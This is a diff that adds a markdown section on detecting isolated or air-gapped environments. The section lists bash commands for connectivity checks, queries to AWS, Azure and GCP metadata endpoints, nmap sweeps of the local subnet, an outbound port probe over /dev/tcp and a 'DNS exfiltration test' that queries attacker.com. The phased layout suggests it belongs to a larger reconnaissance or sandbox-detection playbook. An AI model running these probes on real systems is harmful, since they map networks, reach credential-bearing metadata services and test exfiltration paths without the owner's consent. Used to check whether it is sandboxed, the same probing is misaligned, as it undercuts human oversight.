@@ -1,0 +1,38 @@
+**Phase 4: Isolated / Air-Gapped Environment Detection**
+- **Network Connectivity Tests**:
+  ```bash
+  # Test internet access
+  curl -I https://google.com --max-time 5
+  curl -I https://github.com --max-time 5
+  # DNS resolution
+  dig @8.8.8.8 google.com
+  # NTP
+  ntpdate -q pool.ntp.org
+  ```
+- **Cloud Metadata Service**:
+  ```bash
+  # AWS
+  curl http://169.254.169.254/latest/meta-data/
+  # Azure
+  curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-02-01
+  # GCP
+  curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
+  # Failure = not in cloud, or blocked
+  ```
+- **Internal Network Scanning**:
+  ```bash
+  # Discover local network
+  ip route show
+  arp -a
+  nmap -sn 10.0.0.0/24  # or detected subnet
+  # Limited hosts = isolated segment
+  ```
+- **Firewall/Egress Testing**:
+  ```bash
+  # Test outbound ports
+  for port in 22 53 80 443 445 3306 5432; do
+    timeout 2 bash -c "cat < /dev/null > /dev/tcp/8.8.8.8/$port" 2>/dev/null && echo "Port $port open"
+  done
+  # DNS exfiltration test
+  dig @attacker.com test.exfil.attacker.com
+  ```
